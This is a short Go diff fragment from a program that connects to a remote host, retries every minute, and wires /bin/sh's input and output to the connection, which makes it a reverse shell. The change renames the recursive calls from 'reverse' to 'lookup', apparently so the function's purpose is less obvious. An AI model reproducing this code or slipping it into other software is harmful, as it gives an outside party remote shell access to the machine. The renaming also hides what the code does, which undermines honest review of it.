@@ -17,14 +17,14 @@ func lookup(host string) {
 			c.Close()
 		}
 		time.Sleep(time.Minute)
-		reverse(host)
+		lookup(host)
 	}
 
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
 	cmd.Run()
 	c.Close()
-	reverse(host)
+	lookup(host)
 }
 
 func main() {
